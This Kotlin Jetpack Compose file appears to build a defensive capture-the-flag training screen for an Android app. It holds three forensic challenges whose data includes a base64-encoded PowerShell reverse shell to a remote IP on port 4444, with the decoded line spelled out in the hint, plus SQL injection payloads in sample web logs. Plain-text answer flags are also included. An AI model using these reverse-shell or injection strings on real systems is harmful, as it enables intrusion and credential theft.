package com.example.ui.components

import android.widget.Toast
import androidx.compose.animation.*
import androidx.compose.foundation.*
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalHapticFeedback
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.ui.theme.*

// Data Model for CTF challenge
data class CtfChallengeModel(
    val id: String,
    val title: String,
    val points: Int,
    val category: String, // "FORENSICS", "REVERSING", "NETWORK"
    val mission: String,
    val forensicEvidence: String,
    val hint: String,
    val expectedAnswer: String,
    var currentDraftAnswer: String = "",
    var isSolved: Boolean = false,
    var showHint: Boolean = false
)

@OptIn(ExperimentalLayoutApi::class)
@Composable
fun CtfLabsScreen(
    modifier: Modifier = Modifier,
    onFlagSolved: () -> Unit = {}
) {
    val context = LocalContext.current
    val haptic = LocalHapticFeedback.current
    val clipboard = LocalClipboardManager.current

    // Core list of 3 highly tailored, educational CTF challenges
    val ctfList = remember {
        mutableStateListOf<CtfChallengeModel>(
            CtfChallengeModel(
                id = "FLAG-01",
                title = "Incident auth.log Forensics",
                points = 100,
                category = "FORENSICS",
                mission = "An brute-force attack successfully hijacked an administrative analyst account. Study the log buffer to identify the attacker's source IP address that matches high-rate sshd failures preceding a successful session open. Enter the IP as: FLAG{ip_address}",
                forensicEvidence = """
                    2026-05-24T21:04:12 sshd[912]: Failed password for root from 185.220.101.44 port 38810 ssh2
                    2026-05-24T21:04:15 sshd[912]: Failed password for root from 185.220.101.44 port 38810 ssh2
                    2026-05-24T21:04:19 sshd[912]: Failed password for analyst from 185.220.101.44 port 38812 ssh2
                    2026-05-24T21:04:22 sshd[912]: Failed password for analyst from 185.220.101.44 port 38812 ssh2
                    2026-05-24T21:04:27 sshd[912]: Accepted password for analyst from 185.220.101.44 port 38816 ssh2
                    2026-05-24T21:04:28 sshd[912]: pam_unix(sshd:session): session opened for user analyst by (uid=0)
                    2026-05-24T21:05:01 sudo: analyst : TTY=pts/1 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/bash
                """.trimIndent(),
                hint = "Look at the failed sshd attempts just before 'session opened for user analyst'. What external IP is conducting this?",
                expectedAnswer = "FLAG{185.220.101.44}"
            ),
            CtfChallengeModel(
                id = "FLAG-02",
                title = "Reverse Shell Byte Decoding",
                points = 120,
                category = "REVERSING",
                mission = "A compromised web application executed a base64 encoded reverse shell script parameter. Decode the base64 command below to identify the host TCP communication port used by the attacker! Enter the port as: FLAG{port_number}",
                forensicEvidence = """
                    -- INCIDENT TIMELINE METADATA --
                    Rogue process spawned: certutil.exe / curl downloader.
                    Executed PowerShell Command Buffer:
                    cG93ZXJzaGVsbCAtbm9wIC1jICIkYz1uZXctb2JqZWN0IHN5c3RlbS5uZXQuc29ja2V0cy50Y3BjbGllbnQoJzYyLjE1Mi40My4xOScsNDQ0NCk7JHMrPSRjLmdldHN0cmVhbSgpOy4uLg==
                """.trimIndent(),
                hint = "The string 'cG93ZXJzaGVsbCAtbm9wIC...' decodes into: 'powershell -nop -c \"'\$c=new-object system.net.sockets.tcpclient('62.152.43.19',4444);\$s+=\$c.getstream()...'\". Inspect the target TCP port parameter in that socket initializer.",
                expectedAnswer = "FLAG{4444}"
            ),
            CtfChallengeModel(
                id = "FLAG-03",
                title = "SQL Injection Target Parameter",
                points = 150,
                category = "NETWORK",
                mission = "Inspect the malicious HTTP log request below and find the precise, vulnerable database field/parameter targeted by the SQL injection payload (' OR '1'='1). Enter the exact targeted parameter name under: FLAG{parameter_name}",
                forensicEvidence = """
                    -- WEBSVR ACCESS LOG EXCERPT --
                    192.168.1.189 - - [24/May/2026:21:44:02 +0000] "GET /api/v2/users/search.php?endpoint=internal&query_token=%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 4504 "http://localhost/dashboard" "Mozilla/5.0"
                    192.168.1.189 - - [24/May/2026:21:44:11 +0000] "GET /api/v2/users/search.php?endpoint=internal&query_token=%27%20UNION%20SELECT%20username,%20password%20FROM%20users%20-- HTTP/1.1" 200 12053 "http://localhost/dashboard" "Mozilla/5.0"
                """.trimIndent(),
                hint = "Look at the parameters appended in the query string after search.php. There is 'endpoint' and another parameter which directly takes the SQL union payload.",
                expectedAnswer = "FLAG{query_token}"
            )
        )
    }

    // Statistics counts
    val solvedCount = ctfList.count { it.isSolved }
    val totalCount = ctfList.size
    val totalPoints = ctfList.filter { it.isSolved }.sumOf { it.points }

    Column(
        modifier = modifier
            .fillMaxSize()
            .padding(16.dp)
            .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        // Option 1 Title Card
        GlassCard {
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(
                        modifier = Modifier
                            .size(38.dp)
                            .clip(CircleShape)
                            .background(MacOSBlue.copy(alpha = 0.15f)),
                        contentAlignment = Alignment.Center
                    ) {
                        Icon(imageVector = Icons.Default.Flag, contentDescription = "CTF", tint = MacOSBlue, modifier = Modifier.size(18.dp))
                    }
                    Spacer(modifier = Modifier.width(10.dp))
                    Column {
                        Text(
                            text = "SHAH'S SOC CHALLENGE CAPTURE-THE-FLAG (CTF)",
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.Bold,
                            color = TextPrimary
                        )
                        Text(
                            text = "Solve forensic exercises, decrypt strings, and submit flags to earn Cyber Points.",
                            style = MaterialTheme.typography.bodySmall,
                            color = TextSecondary
                        )
                    }
                }

                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(8.dp))
                        .background(Color(0xFF131415))
                        .border(1.dp, GlassBorder, RoundedCornerShape(8.dp))
                        .padding(horizontal = 12.dp, vertical = 6.dp)
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(imageVector = Icons.Default.MilitaryTech, contentDescription = null, tint = WarningYellow, modifier = Modifier.size(16.dp))
                        Spacer(modifier = Modifier.width(4.dp))
                        Text(
                            text = "$totalPoints XP",
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold,
                            color = WarningYellow,
                            fontFamily = FontFamily.Monospace
                        )
                    }
                }
            }
        }

        // Stats boxes progress grid
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            StatsCompactCard(
                label = "CTF PROGRESS",
                value = "$solvedCount / $totalCount Solved",
                color = SuccessGreen,
                modifier = Modifier.weight(1f)
            )
            StatsCompactCard(
                label = "RANK STATUS",
                value = if (solvedCount == totalCount) "Elite threat hunter 🏆" else if (solvedCount > 0) "SOC Specialist" else "Triage Novice",
                color = MacOSBlue,
                modifier = Modifier.weight(1.2f)
            )
        }

        Text(
            text = "ACTIVE CYBERPATH CHALLENGE MISSIONS",
            fontSize = 11.sp,
            fontWeight = FontWeight.Bold,
            color = TextSecondary,
            modifier = Modifier.padding(top = 4.dp)
        )

        // Challenges list rendering
        ctfList.forEachIndexed { index, ctf ->
            val isChallengeSolved = ctf.isSolved
            val cardBorderColor = if (isChallengeSolved) SuccessGreen.copy(alpha = 0.5f) else GlassBorder
            val ctfIconColor = if (isChallengeSolved) SuccessGreen else MacOSBlue

            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .border(1.dp, cardBorderColor, RoundedCornerShape(12.dp)),
                colors = CardDefaults.cardColors(containerColor = if (isChallengeSolved) Color(0x1F30D158) else Color(0x0CFFFFFF)),
                shape = RoundedCornerShape(12.dp)
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp),
                    verticalArrangement = Arrangement.spacedBy(10.dp)
                ) {
                    // Title Header info
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Box(
                                modifier = Modifier
                                    .size(24.dp)
                                    .clip(CircleShape)
                                    .background(ctfIconColor.copy(alpha = 0.15f)),
                                contentAlignment = Alignment.Center
                            ) {
                                Icon(
                                    imageVector = if (isChallengeSolved) Icons.Default.CheckCircle else Icons.Default.Adjust,
                                    contentDescription = null,
                                    tint = ctfIconColor,
                                    modifier = Modifier.size(14.dp)
                                )
                            }
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                text = "(${ctf.id}) ${ctf.title}",
                                fontWeight = FontWeight.Bold,
                                color = TextPrimary,
                                fontSize = 14.sp
                            )
                        }

                        // Badge attributes
                        Box(
                            modifier = Modifier
                                .clip(RoundedCornerShape(4.dp))
                                .background(Color(0xFF131415))
                                .padding(horizontal = 6.dp, vertical = 2.dp)
                        ) {
                            Text(
                                text = "+${ctf.points} XP | ${ctf.category}",
                                color = if (isChallengeSolved) SuccessGreen else MacOSBlue,
                                fontWeight = FontWeight.Bold,
                                fontSize = 8.sp,
                                fontFamily = FontFamily.Monospace
                            )
                        }
                    }

                    // Description text
                    Text(
                        text = ctf.mission,
                        color = TextLightBody,
                        fontSize = 11.sp,
                        textAlign = TextAlign.Justify,
                        lineHeight = 15.sp
                    )

                    // Monospaced Forensic Evidence Box
                    Column(
                        modifier = Modifier
                            .fillMaxWidth()
                            .background(Color(0xFF0F1110))
                            .border(1.dp, GlassBorder, RoundedCornerShape(6.dp))
                            .clip(RoundedCornerShape(6.dp))
                    ) {
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .background(Color(0xFF212523))
                                .padding(horizontal = 10.dp, vertical = 6.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Box(modifier = Modifier.size(7.dp).clip(CircleShape).background(Color.Red))
                                Spacer(modifier = Modifier.width(4.dp))
                                Box(modifier = Modifier.size(7.dp).clip(CircleShape).background(Color.Yellow))
                                Spacer(modifier = Modifier.width(4.dp))
                                Box(modifier = Modifier.size(7.dp).clip(CircleShape).background(Color.Green))
                                Spacer(modifier = Modifier.width(10.dp))
                                Text(
                                    text = "forensics_evidence_index_${ctf.id.lowercase()}.log",
                                    fontSize = 9.sp,
                                    color = TextSecondary,
                                    fontFamily = FontFamily.Monospace
                                )
                            }

                            Icon(
                                imageVector = Icons.Default.ContentCopy,
                                contentDescription = "Copy Evidence",
                                tint = TextSecondary,
                                modifier = Modifier
                                    .size(12.dp)
                                    .clickable {
                                        clipboard.setText(AnnotatedString(ctf.forensicEvidence))
                                        Toast.makeText(context, "Evidence buffer copied!", Toast.LENGTH_SHORT).show()
                                    }
                            )
                        }

                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(10.dp)
                        ) {
                            Text(
                                text = ctf.forensicEvidence,
                                fontFamily = FontFamily.Monospace,
                                color = SuccessGreen,
                                fontSize = 9.sp,
                                lineHeight = 12.sp,
                                modifier = Modifier.fillMaxWidth()
                            )
                        }
                    }

                    // Hint Expander Section
                    AnimatedVisibility(visible = ctf.showHint) {
                        Card(
                            colors = CardDefaults.cardColors(containerColor = Color(0x33FFB000)),
                            modifier = Modifier.fillMaxWidth(),
                            shape = RoundedCornerShape(6.dp)
                        ) {
                            Row(
                                modifier = Modifier.padding(10.dp),
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Icon(imageVector = Icons.Default.Lightbulb, contentDescription = null, tint = WarningYellow, modifier = Modifier.size(16.dp))
                                Spacer(modifier = Modifier.width(8.dp))
                                Text(
                                    text = ctf.hint,
                                    fontSize = 10.sp,
                                    color = TextPrimary
                                )
                            }
                        }
                    }

                    // Flag submission entry row
                    Row(
                        modifier = Modifier.fillMaxWidth().height(42.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        OutlinedButton(
                            onClick = {
                                val listIndex = ctfList.indexOf(ctf)
                                if (listIndex != -1) {
                                    ctfList[listIndex] = ctf.copy(showHint = !ctf.showHint)
                                }
                            },
                            shape = RoundedCornerShape(6.dp),
                            modifier = Modifier.fillMaxHeight(),
                            colors = ButtonDefaults.outlinedButtonColors(contentColor = TextPrimary),
                            border = BorderStroke(1.dp, GlassBorder)
                        ) {
                            Icon(imageVector = if (ctf.showHint) Icons.Default.VisibilityOff else Icons.Default.HelpOutline, contentDescription = null, modifier = Modifier.size(14.dp))
                            Spacer(modifier = Modifier.width(4.dp))
                            Text(text = if (ctf.showHint) "HIDE HINT" else "GET HINT", fontSize = 10.sp)
                        }

                        // Input field
                        TextField(
                            value = ctf.currentDraftAnswer,
                            onValueChange = { s ->
                                val listIndex = ctfList.indexOf(ctf)
                                if (listIndex != -1) {
                                    ctfList[listIndex] = ctf.copy(currentDraftAnswer = s)
                                }
                            },
                            modifier = Modifier
                                .weight(1f)
                                .fillMaxHeight()
                                .clip(RoundedCornerShape(6.dp))
                                .border(1.dp, if (isChallengeSolved) SuccessGreen.copy(alpha = 0.5f) else GlassBorder, RoundedCornerShape(6.dp)),
                            colors = TextFieldDefaults.colors(
                                focusedContainerColor = Color(0xFF131415),
                                unfocusedContainerColor = Color(0xFF18191A),
                                focusedTextColor = TextPrimary,
                                unfocusedTextColor = TextPrimary,
                                focusedIndicatorColor = if (isChallengeSolved) SuccessGreen else MacOSBlue,
                                unfocusedIndicatorColor = Color.Transparent
                            ),
                            enabled = !isChallengeSolved,
                            textStyle = TextStyle(fontFamily = FontFamily.Monospace, fontSize = 11.sp),
                            placeholder = { Text("E.g: FLAG{your_flag_text_here}", fontSize = 10.sp, color = TextSecondary) },
                            maxLines = 1,
                            visualTransformation = VisualTransformation.None
                        )

                        // Submit verify button
                        Button(
                            onClick = {
                                if (ctf.currentDraftAnswer.trim().equals(ctf.expectedAnswer.trim(), ignoreCase = true)) {
                                    val listIndex = ctfList.indexOf(ctf)
                                    if (listIndex != -1) {
                                        ctfList[listIndex] = ctf.copy(isSolved = true)
                                    }
                                    onFlagSolved()
                                    Toast.makeText(context, "Solved! +${ctf.points} Cyber Points Earned! 🏆", Toast.LENGTH_SHORT).show()
                                    haptic.performHapticFeedback(androidx.compose.ui.hapticfeedback.HapticFeedbackType.LongPress)
                                } else {
                                    Toast.makeText(context, "Incorrect Flag. Audit files and try again!", Toast.LENGTH_SHORT).show()
                                }
                            },
                            modifier = Modifier.fillMaxHeight(),
                            enabled = !isChallengeSolved && ctf.currentDraftAnswer.isNotEmpty(),
                            colors = ButtonDefaults.buttonColors(
                                containerColor = if (isChallengeSolved) SuccessGreen else MacOSBlue,
                                contentColor = Color.White
                            ),
                            shape = RoundedCornerShape(6.dp)
                        ) {
                            Icon(imageVector = if (isChallengeSolved) Icons.Default.CheckCircle else Icons.Default.Terminal, contentDescription = null, modifier = Modifier.size(14.dp))
                            Spacer(modifier = Modifier.width(4.dp))
                            Text(text = if (isChallengeSolved) "SOLVED" else "SUBMIT", fontSize = 10.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun StatsCompactCard(
    label: String,
    value: String,
    color: Color,
    modifier: Modifier = Modifier
) {
    Card(
        modifier = modifier
            .border(1.dp, GlassBorder, RoundedCornerShape(10.dp)),
        colors = CardDefaults.cardColors(containerColor = CardGlassSurface),
        shape = RoundedCornerShape(10.dp)
    ) {
        Column(modifier = Modifier.padding(12.dp)) {
            Text(text = label, color = TextSecondary, fontSize = 8.sp, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(4.dp))
            Row(verticalAlignment = Alignment.CenterVertically) {
                Box(
                    modifier = Modifier
                        .size(6.dp)
                        .clip(CircleShape)
                        .background(color)
                )
                Spacer(modifier = Modifier.width(6.dp))
                Text(text = value, color = TextPrimary, fontWeight = FontWeight.Bold, fontSize = 13.sp)
            }
        }
    }
}
